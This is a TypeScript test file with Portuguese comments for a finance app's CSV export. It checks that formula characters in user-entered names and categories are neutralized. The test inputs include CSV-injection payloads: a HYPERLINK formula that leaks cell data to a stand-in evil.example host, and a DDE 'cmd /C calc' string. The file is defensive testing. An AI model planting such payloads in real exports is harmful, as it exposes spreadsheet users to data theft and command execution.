import { describe, expect, it } from "vitest";
import { buildCsv, neutralizeFormula, type Transaction } from "./index";

// SEC-15: o CSV exportado não pode carregar fórmulas vindas de texto do usuário.

const tx = (over: Partial<Transaction>): Transaction => ({
  id: "t",
  name: "Mercado",
  amount: 80000,
  type: "expense",
  category: "Alimentação",
  month: "2026-02",
  ...over,
});

const opts = { summary: false, entries: true, credit: false };

/** Lê o CSV (separador `;`, aspas duplas, `""` como aspa) e devolve as linhas de dados dos lançamentos. */
function entryRows(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < csv.length; i++) {
    const c = csv[i];
    if (quoted) {
      if (c === '"' && csv[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"') quoted = true;
    else if (c === ";") {
      row.push(cell);
      cell = "";
    } else if (c === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
    } else cell += c;
  }
  // [0] = "Lançamentos", [1] = cabeçalho
  return rows.slice(2).filter((r) => r.length > 1);
}

const DANGEROUS = /^[\t\r ]*[=+\-@]|^[\t\r]/;

describe("neutralizeFormula", () => {
  it.each([
    ["=1+1", "'=1+1"],
    ["+55 11 99999-9999", "'+55 11 99999-9999"],
    ["-Mercado", "'-Mercado"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", "'\r=1+1"],
    ["  =1+1", "'  =1+1"], // espaços antes da fórmula
    ['=HYPERLINK("http://evil";"clique")', `'=HYPERLINK("http://evil";"clique")`],
  ])("prefixa aspa em %j", (input, expected) => {
    expect(neutralizeFormula(input)).toBe(expected);
  });

  it.each(["Mercado", "Aluguel", "Pão & Café", "3 pizzas", "Parcela 1/3", "a=b", "x+y", "e-mail", "R$ -5", "", "Fixa"])(
    "não mexe em texto comum: %j",
    (input) => {
      expect(neutralizeFormula(input)).toBe(input);
    },
  );
});

describe("buildCsv sem injeção de fórmula", () => {
  const evil = [
    tx({ id: "1", name: '=HYPERLINK("http://evil.example/?x="&A1;"abrir")', category: "Outros" }),
    tx({ id: "2", name: "+cmd|' /C calc'!A0", category: "Outros" }),
    tx({ id: "3", name: "-2+3", category: "Outros" }),
    tx({ id: "4", name: "@SUM(1+1)", category: "Outros" }),
    tx({ id: "5", name: "Normal", category: "=1+1" }), // nome de categoria própria também é texto do usuário
    tx({ id: "6", name: "\t=1+1", category: "Outros" }),
  ];
  const csv = buildCsv({ transactions: evil, creditTransactions: [] }, ["2026-02"], opts);
  const rows = entryRows(csv);

  it("nenhuma célula de texto do usuário (nome, categoria, observação) começa com caractere de fórmula", () => {
    expect(rows).toHaveLength(evil.length);
    for (const r of rows) {
      const [, name, category, , , note] = r;
      for (const text of [name, category, note]) expect(text, JSON.stringify(r)).not.toMatch(DANGEROUS);
    }
  });

  it("o conteúdo original continua legível, só com a aspa na frente", () => {
    const names = rows.map((r) => r[1]);
    expect(names).toContain(`'=HYPERLINK("http://evil.example/?x="&A1;"abrir")`);
    expect(names).toContain("'-2+3");
    expect(rows.map((r) => r[2])).toContain("'=1+1");
  });

  it("a coluna de valores continua numérica (negativos não ganham aspa)", () => {
    const c = buildCsv(
      { transactions: [tx({ amount: 80000 })], creditTransactions: [] },
      ["2026-02"],
      { summary: true, entries: true, credit: false },
    );
    expect(c).toContain("2026-02;0,00;800,00;-800,00"); // saldo negativo do resumo, sem aspa
    expect(c).toContain(";Despesa;800,00;");
    expect(c).not.toContain("'-800,00");
  });

  it("texto comum e o escape de ; e aspas continuam como antes", () => {
    const c = buildCsv(
      { transactions: [tx({ name: 'Mercado; "grande"' })], creditTransactions: [] },
      ["2026-02"],
      { summary: false, entries: true, credit: false },
    );
    expect(c).toContain('"Mercado; ""grande"""');
    const [row] = entryRows(c);
    expect(row[1]).toBe('Mercado; "grande"');
  });

  it("a observação de despesa fixa e de parcela não é alterada", () => {
    const c = buildCsv(
      {
        transactions: [tx({ fixed: true })],
        creditTransactions: [{ id: "c", name: "TV", totalAmount: 90000, installments: 3, startMonth: "2026-02", category: "Lazer" }],
      },
      ["2026-02"],
      { summary: false, entries: true, credit: true },
    );
    const notes = entryRows(c).map((r) => r[5]);
    expect(notes).toEqual(["Fixa", "Parcela 1/3"]);
  });
});
